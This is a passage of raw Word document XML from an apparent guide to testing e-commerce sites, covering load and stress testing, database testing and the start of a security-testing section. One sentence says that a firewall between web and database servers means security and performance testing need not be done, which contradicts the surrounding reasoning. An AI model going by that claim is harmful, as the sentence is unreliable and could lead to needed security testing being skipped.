        <w:t>E-commerce sites that rely on a heavy volume of trading on the Internet need to make sure that their Web servers have a very high uptime. To prevent breakdown and to offload traffic from a server at peak time, entrepreneurs must invest in additional Web servers. The power of a Web server to handle a heavy load at peak hours depends on the network speed and the server’s processing power, memory, and storage space of the server. The hardware component of the Web server is most vulnerable at peak hours.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The number of simultaneous users that the server can successfully handle measures its capacity. Excessive load on the Web server causes it to degrade dramatically in performance until the load is reduced. The objective of this load testing is to determine an optimum number of simultaneous users.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Stress testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Running the system in a high-stress mode creates high demands on resources and stress tests the system. Some systems are designed to handle a specified volume of load. For example, a bank transaction processing system may be designed to process up to 100 transactions per second; an operating system may be designed to handle up to 200 separate terminals. Tests must be designed to ensure that the system can process expected load. This usually involves planning a series of tests where the load is gradually increased to reflect the expected usage pattern.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Stress tests steadily increase the load on the system beyond the maximum design load until the system fails. This type of testing has a dual function:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="191"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>It tests the failure behavior of the system. Circumstances may arise through an unexpected combination of events where the load placed on the system exceeds the maximum anticipated load. Stress testing determines if overloading the system results in loss of data or user service.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="191"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>It stresses the system and may cause certain defects to come to light, which may not normally manifest the errors.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Stress testing is particularly relevant to an e-commerce system with Web databases. These systems often exhibit severe degradation when the network is swamped with operating system calls.</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Load testing software</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>There is a lot of load-testing software.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The testing technique used by most software is to simulate multiple logons. After a series of these multiple logons, the software calculates the optimum load factor for the Web server. The Web server software is then configured using this test data. As a result, if the traffic increases beyond the load capacity of the Web server, the server stops entertaining further requests from online users. For more details on Web server load testing, see </w:t>
      </w:r>
      <w:hyperlink r:id="rId251" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="00709F"/>
          </w:rPr>
          <w:t>www.Webperfcenter.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The Microsoft® Web Application Stress (WAST) tool is designed to simulate multiple browsers that are requesting pages from a Web site. This tool can realistically simulate many requests with relatively few client machines. Make sure that you are using an adequate number of client machines.</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89" w:name="testproc_data"/>
      <w:bookmarkEnd w:id="1289"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Semibold" w:hAnsi="Segoe UI Semibold"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>Testing Data Tier</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Database Testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>An e-commerce site typically stores catalogs, shopping baskets, user profiles, and order information in the database.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Location of a database</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The database does not have to be on the same server on which the storefront is hosted. The database server can be separated from the Web server by a firewall. This adds complexity to the testing processes. Therefore, you do not have to perform accessibility, security testing, and performance testing.</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Objectives of database testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The purpose of database testing is to determine how well the database meets requirements. This is an ongoing process because no database is static. When a database is created, a mirror of the same database should be created and stored either on the same computer or another computer. The original database is left alone and its mirror image goes through the various tests. This process continues until the tests are successful so that the changes can be implemented in the original database.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Databases are tested for five reasons:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="192"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Relevance of search results</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="192"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Query response time</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="192"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Data integrity</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="192"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Data validity</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="192"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Recovery</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496"/>
        <w:gridCol w:w="3360"/>
        <w:gridCol w:w="3744"/>
      </w:tblGrid>
      <w:tr w:rsidR="004C44FA" w:rsidTr="004C44FA">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="130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What to Test</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="17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Environment</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1950" w:type="pct"/>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hideMark/>
          </w:tcPr>
          <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA">
            <w:pPr>
              <w:spacing w:before="300" w:after="300"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="636363"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="636363"/>
              </w:rPr>
              <w:t>Tools/Technique</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004C44FA" w:rsidTr="004C44FA">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="13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Relevance of search results</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System test environment</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="19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Black Box and White Box technique</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004C44FA" w:rsidTr="004C44FA">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="13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Query response time</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System test environment</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="19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Syntax Testing /Functional Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004C44FA" w:rsidTr="004C44FA">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="13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Data integrity</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19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White Box Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004C44FA" w:rsidTr="004C44FA">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="130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Data validity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="17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Development environment</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1950" w:type="pct"/>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4C44FA" w:rsidRDefault="004C44FA">
            <w:pPr>
              <w:spacing w:before="300" w:after="300"/>
              <w:rPr>
                <w:color w:val="2A2A2A"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2A2A2A"/>
              </w:rPr>
              <w:t>White Box Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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Relevance of Database Search Results</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The Search option is one of the most frequently used functions of online databases. Search results provide direct links to other pages, saving time and effort.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Many site visitors complain that Search results are not relevant or result in “wild goose chases.” Therefore, building relevance into database searches is an essential part of data handling.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Testing for Search relevance should be carried out by a team of people that are not a part of the development team. This team assumes the role of the online customer and tries out random Search options with different keywords. The Search results are recorded by the percentage of relevance to the keyword. At the end of the testing process, the team comes up with a series of recommendations. This can be incorporated into the database Search options.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Query Response Time</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The query response time is essential in online transactions. The turnaround time for responding to queries in a database must be short. The results from this testing may help to identify problems, such as bottlenecks in the network, specific queries, the database structure, or the hardware.</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lastRenderedPageBreak/>
        <w:t>Data Integrity</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Important data stored in the database include the catalog, pricing, shipping tables, tax tables, order database, and customer information. Testing must verify the correctness of the stored data. Therefore, testing should be performed on a regular basis because data changes over time.</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Examples of data integrity tests</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="193"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Test the creation, modification, and deletion of data in tables as specified in the functionality.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="193"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Test to make sure that sets of radio buttons represent a fixed set of values. Check what happens when a blank value is retrieved from the database.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="193"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Test that when a particular set of data is saved to the database, each value gets saved fully. In other words, the truncation of strings and rounding of numeric value does not occur.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="193"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Test whether default values are saved in the database if the user input is not specified.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="193"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Test the compatibility with old data. In addition, old hardware, versions of the operating system, and interfaces with other software need to be tested.</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Data Validity</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Errors caused due to incorrect data entry, called data validity errors, are probably the most common data-related errors. These errors are also the most difficult to detect in the system. These errors are typically caused when a large volume of data is entered in a short time frame. For example, $67 can be entered as $76 by mistake. The data entered is therefore invalid.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t xml:space="preserve">You can reduce data validity errors. Use the data validation rules in the data fields. For example, the date field in a database uses the MM/DD/YYYY format. A developer can incorporate a data validation </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>rule,</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t xml:space="preserve"> such that MM does not exceed 12, DD does not exceed 31.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>In many cases, simple field validation rules are unable to detect data validity errors. Here, queries can be used to validate data fields. For example, a query can be written to compare the sum of the numbers in the database data field with the original sum of numbers from the source. A difference between the figures indicates an error in at least one data element.</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Recovery Testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Another test that is performed on database software is the Recovery test. This test involves forcing the system to fail in a variety of ways to ensure that:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="194"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>The system recovers from faults and resumes processing within a pre-defined period of time.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="194"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>The system is fault-tolerant, which means that processing faults do not halt the overall functioning of the system.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="194"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Data recovery and restart are correct in case of auto-recovery. If recovery requires human intervention, then the mean time to repair the database is within pre-defined acceptable limits.</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90" w:name="testproc_other"/>
      <w:bookmarkEnd w:id="1290"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Semibold" w:hAnsi="Segoe UI Semibold"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>Other Tests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Security</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Gaining the confidence of online customers is extremely important to e-commerce success. Building the confidence of online customers is not an easy task and requires a lot of time and effort. Therefore, entrepreneurs must plan confidence-building measures. Ensuring the security of transactions over the Internet ensures customer confidence.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>The main technique in security testing is to attempt to violate built-in security controls. This technique ensures that the protection mechanisms in the system secure it from improper penetration.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The tester overwhelms the system by continuous requests, thereby denying service to others. The tester may purposely cause system errors to penetrate during recovery or may browse through insecure data to find the key to system entry.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>There are two distinct areas of concern in e-commerce security: network security and payment transaction security. Types of security breaches in these areas are:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="195"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Secrecy</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="195"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Authentication</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="195"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Non-repudiation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="195"/>
